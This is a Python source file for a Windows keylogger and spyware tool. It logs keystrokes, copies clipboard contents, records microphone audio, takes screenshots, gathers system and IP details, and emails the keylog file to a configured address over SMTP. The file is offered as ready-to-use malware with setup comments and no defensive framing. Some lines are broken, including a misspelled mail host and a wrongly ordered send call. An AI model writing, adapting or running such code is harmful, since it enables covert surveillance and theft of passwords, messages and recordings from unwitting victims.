
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
from typing import Counter, NoReturn
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab


#enter your file name or leave as it it
keys_information = "keylogs.txt"
#change the path where keylogs.txt is to be saved, it differs for everyone
filepath = 'D:\\softwares\\keylogger'
extend = '\\'
count = 0
keys = []


system_information = "systeminfo.txt"


clipboard_information = "clipboardinfo.txt"


audio_information = "audio.wav"
microphone_time = 20


screenshot_information = "screenshot.png"

email_id = "Your Email address goes here"
email_password = "Password for above Email entered goes here"
email_receiver = "Receiver Email address goes here"


#First setup IMAP settings in settings of your mail account, Enable IMAP in POP Forwarding/IMAP tab and allow less secure apps ON

def send_mail(filename, attachment, email_receiver):
    email_sender = email_id
    msg = MIMEMultipart()
    msg['From'] = email_sender
    msg['To'] =  email_receiver
    msg['Subject'] = "Log File"
    body = "some text"
    msg.attach(MIMEText(body,'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition'," Attachment ; fileame = %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmil.com',587)
    s.starttls()
    s.login(email_sender, email_password)
    text = msg.as_string()
    s.sendmail(email_sender,email_receiver,text)
    s.quit()


send_mail(keys_information,filepath+extend+keys_information,email_receiver)


def computer_information():
    with open(filepath+extend+system_information,"a") as f:
        host_name = socket.gethostname()
        IP_Address = socket.gethostbyname(host_name)
        try:
            public_ip = get("https://api.ipify.org").text()
            f.write("Public IP Address :" + public_ip + '\n')
        except Exception:
            f.write("Failed to grab Public IP(may be due to max requests)"+'\n')

        f.write("Processor : " + (platform.processor()) + '\n')
        f.write("System :" + platform.system() + " " + platform.version() + '\n')
        f.write("Machine :" + platform.machine() + '\n')
        f.write("Hostname :" + host_name + '\n')
        f.write("Private IP Address :" + IP_Address + '\n')


computer_information()


def copy_clipboard():
    with open(filepath + extend + clipboard_information,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data :\n" + pasted_data)
        except:
            f.write("Clipboard could not be copied.\n")


copy_clipboard()


def microphone():
    fs = 44100
    seconds = microphone_time
    my_recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(filepath + extend + audio_information, fs, my_recording)


microphone()


def screenshot():
    image = ImageGrab.grab()
    image.save(filepath + extend + screenshot_information)


screenshot()


def on_press(key):
    global keys,count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(filepath + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc :
        return False


with Listener(on_press = on_press,on_release = on_release) as listener:
    listener.join()
